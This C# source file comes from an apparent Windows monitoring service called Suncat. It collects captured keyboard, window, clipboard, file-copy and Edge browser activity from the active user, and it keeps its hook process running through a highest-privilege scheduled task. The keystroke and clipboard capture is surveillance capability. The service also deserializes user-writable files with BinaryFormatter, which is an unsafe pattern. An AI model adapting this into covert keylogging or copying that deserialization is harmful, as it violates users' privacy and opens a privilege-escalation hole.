using Microsoft.Win32.TaskScheduler;
using SuncatCommon;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace SuncatService.Monitors
{
    public static class HookActivityMonitor
    {
        private static readonly string serviceName = new ProjectInstaller().ServiceInstaller.ServiceName;
        private static readonly string rootDrive = Path.GetPathRoot(Environment.SystemDirectory);
        private static readonly string serviceAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), serviceName);
        private static Dictionary<string, string> lastMutexMD5Hashes = new Dictionary<string, string>();
        private static string hookAssemblyTitle;
        private static string lastSessionUser;
        private static Thread globalKeyboardHook;
        private static Thread globalWindowHook;
        private static Thread globalClipboardHook;
        private static Thread globalCopyFilesHook;
        private static Thread globalEdgeHook;
        private static Thread taskChecker;
        

        static HookActivityMonitor()
        {
            lastMutexMD5Hashes.Add("Keyboard", default(string));
            lastMutexMD5Hashes.Add("Window", default(string));
            lastMutexMD5Hashes.Add("Clipboard", default(string));
            lastMutexMD5Hashes.Add("CopyFiles", default(string));
            lastMutexMD5Hashes.Add("Edge", default(string));
        }

        public static event TrackEventHandler Track;

        public static List<SuncatFileInfo> LastCopiedFiles { get; set; }

        private static void StartGlobalHook(string type)
        {
            while (true)
            {
                try
                {
                    Mutex mutex;

                    if (Mutex.TryOpenExisting($@"Global\Suncat{type}HookMapMutex", out mutex))
                    {
                        using (mutex)
                        {
                            while (mutex.WaitOne())
                            {
                                try
                                {
                                    var session = SuncatUtilities.GetActiveSession();

                                    if (session != null && !string.IsNullOrEmpty(session.UserName))
                                    {
                                        var mapName = $@"Suncat{type}HookMap";
                                        var mapFile = $@"{rootDrive}Users\{session.UserName}\AppData\Local\{serviceName}\Hook\{mapName}.data";

                                        if (File.Exists(mapFile))
                                        {
                                            var mutexMD5Hash = SuncatUtilities.GetMD5HashFromFile(mapFile);

                                            if (mutexMD5Hash != lastMutexMD5Hashes[type])
                                            {
                                                Directory.CreateDirectory($@"{serviceAppData}\Hook");
                                                File.Copy(mapFile, $@"{serviceAppData}\Hook\{mapName}", true);

                                                using (var fileStream = new FileStream($@"{serviceAppData}\Hook\{mapName}", FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                                                {
                                                    if (fileStream.Length > 0)
                                                    {
                                                        using (var map = MemoryMappedFile.CreateFromFile(fileStream, mapName, 0, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                                                        {
                                                            using (var viewStream = map.CreateViewStream())
                                                            {
                                                                var formatter = new BinaryFormatter();
                                                                var buffer = new byte[viewStream.Length];

                                                                viewStream.Read(buffer, 0, (int)viewStream.Length);

                                                                if (!buffer.All(b => b == 0))
                                                                {
                                                                    var log = (SuncatLog)formatter.Deserialize(new MemoryStream(buffer));
                                                                    viewStream.Position = 0;

                                                                    if (log != null && log.Event != SuncatLogEvent.None)
                                                                    {
                                                                        if (log.Event == SuncatLogEvent.CopyFile)
                                                                        {
                                                                            LastCopiedFiles = log.DataObject as List<SuncatFileInfo>;
                                                                        }
                                                                        else
                                                                        {
                                                                            var te = new TrackEventArgs();

                                                                            log.DateTime = DateTime.Now;
                                                                            te.LogData = log;

                                                                            Track?.Invoke(null, te);

                                                                            viewStream.Write(new byte[viewStream.Length], 0, (int)viewStream.Length);
                                                                            viewStream.Position = 0;
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }

                                                lastMutexMD5Hashes[type] = mutexMD5Hash;
                                            }
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    #if DEBUG
                                        Debug.WriteLine(ex);
                                        
                                        if (ex.InnerException != null)
                                            Debug.WriteLine(ex.InnerException);
                                    #else
                                        Trace.WriteLine(ex);

                                        if (ex.InnerException != null)
                                            Trace.WriteLine(ex.InnerException);
                                    #endif

                                    break;
                                }
                                finally
                                {
                                    mutex.ReleaseMutex();
                                }

                                Thread.Sleep(500);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    #if DEBUG
                        Debug.WriteLine(ex);
                        
                        if (ex.InnerException != null)
                            Debug.WriteLine(ex.InnerException);
                    #else
                        Trace.WriteLine(ex);

                        if (ex.InnerException != null)
                            Trace.WriteLine(ex.InnerException);
                    #endif
                }

                Thread.Sleep(500);
            }
        }

        private static void CheckTask()
        {
            while (true)
            {
                try
                {
                    var session = SuncatUtilities.GetActiveSession();

                    if (session != null && !string.IsNullOrEmpty(session.UserName))
                    {
                        using (var ts = new TaskService())
                        {
                            var processes = Process.GetProcessesByName("suncatsat");

                            if (processes.Length > 1 || lastSessionUser != session.UserAccount.Value)
                            {
                                lastSessionUser = session.UserAccount.Value;

                                foreach (var process in processes)
                                {
                                    process.Kill();
                                }
                            }

                            var task = ts.GetTask(hookAssemblyTitle);

                            if (task == null || !task.Enabled || task.State != TaskState.Running)
                            {
                                var assemblyLocationPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

                                task = ts.AddTask(hookAssemblyTitle, QuickTriggerType.TaskRegistration, $@"{assemblyLocationPath}\suncatsat.exe", null, session.UserAccount.Value, null, TaskLogonType.InteractiveToken, null);
                                task.Definition.Principal.RunLevel = TaskRunLevel.Highest;
                                task.Definition.Settings.ExecutionTimeLimit = TimeSpan.Zero;
                                task.RegisterChanges();
                                task.Run();
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    #if DEBUG
                        Debug.WriteLine(ex);
                        
                        if (ex.InnerException != null)
                            Debug.WriteLine(ex.InnerException);
                    #else
                        Trace.WriteLine(ex);

                        if (ex.InnerException != null)
                            Trace.WriteLine(ex.InnerException);
                    #endif
                }

                Thread.Sleep(1000);
            }
        }

        private static void CleanTask()
        {
            try
            {
                using (var ts = new TaskService())
                {
                    var task = ts.GetTask(hookAssemblyTitle);

                    if (task != null)
                    {
                        task.Stop();
                    }

                    ts.RootFolder.DeleteTask(hookAssemblyTitle, false);
                }
            }
            catch (Exception ex)
            {
                #if DEBUG
                    Debug.WriteLine(ex);
                    
                    if (ex.InnerException != null)
                        Debug.WriteLine(ex.InnerException);
                #else
                    Trace.WriteLine(ex);

                    if (ex.InnerException != null)
                        Trace.WriteLine(ex.InnerException);
                #endif
            }
        }

        public static void Start()
        {
            var hookAssemblyAttributes = typeof(SuncatHook.SuncatHook).GetTypeInfo().Assembly.GetCustomAttributes(typeof(AssemblyTitleAttribute));
            var hookAssemblyTitleAttribute = hookAssemblyAttributes.SingleOrDefault() as AssemblyTitleAttribute;
            hookAssemblyTitle = hookAssemblyTitleAttribute.Title;

            CleanTask();

            if (!Debugger.IsAttached)
            {
                taskChecker = new Thread(() => CheckTask());
                taskChecker.IsBackground = true;
                taskChecker.Start();
            }

            globalKeyboardHook = new Thread(() => StartGlobalHook("Keyboard"));
            globalKeyboardHook.IsBackground = true;
            globalKeyboardHook.Start();

            globalWindowHook = new Thread(() => StartGlobalHook("Window"));
            globalWindowHook.IsBackground = true;
            globalWindowHook.Start();

            globalClipboardHook = new Thread(() => StartGlobalHook("Clipboard"));
            globalClipboardHook.IsBackground = true;
            globalClipboardHook.Start();

            globalCopyFilesHook = new Thread(() => StartGlobalHook("CopyFiles"));
            globalCopyFilesHook.IsBackground = true;
            globalCopyFilesHook.Start();

            globalEdgeHook = new Thread(() => StartGlobalHook("Edge"));
            globalEdgeHook.IsBackground = true;
            globalEdgeHook.Start();
        }

        public static void Stop()
        {
            CleanTask();
        }
    }
}
